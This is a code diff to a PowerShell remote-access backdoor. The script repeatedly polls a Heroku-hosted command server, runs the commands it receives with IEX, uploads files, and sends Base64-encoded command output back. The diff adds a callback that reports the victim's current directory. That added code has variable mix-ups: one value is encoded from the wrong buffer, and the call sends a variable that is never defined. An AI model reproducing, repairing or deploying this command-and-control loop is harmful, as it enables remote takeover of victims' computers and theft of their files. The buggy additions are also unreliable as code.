@@ -143,6 +143,8 @@ param($String)
 (New-Object System.Net.WebClient).UploadFile("http://y44v5ltr.herokuapp.com/psfileupload",(Resolve-Path ".\$String"))
 }
 
+$WebClient = (New-Object System.Net.WebClient);
+
 while (1) 
 {
 (New-Object System.Net.WebClient).DownloadString("http://y44v5ltr.herokuapp.com/rs/ping/" + $id + "/" + $username)
@@ -153,7 +155,12 @@ if ([string]::IsNullOrEmpty($s) -eq 0) {
 $out = IEX $s;
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($out)
 $encoded = [Convert]::ToBase64String($Bytes)
-(New-Object System.Net.WebClient).DownloadString("http://y44v5ltr.herokuapp.com/rs/cmdreturn/" + $id + "/" + $encoded)
+
+$Bytess = [System.Text.Encoding]::Unicode.GetBytes(Get-Location)
+$encodeds = [Convert]::ToBase64String($Bytes)
+
+$WebClient.DownloadString("http://y44v5ltr.herokuapp.com/rs/cmdreturn/" + $id + "/" + $encoded)
+$WebClient.DownloadString("http://y44v5ltr.herokuapp.com/rs/currentpath/" + $id + "/" + $encodedd)
 $ps = $s;
 
 }
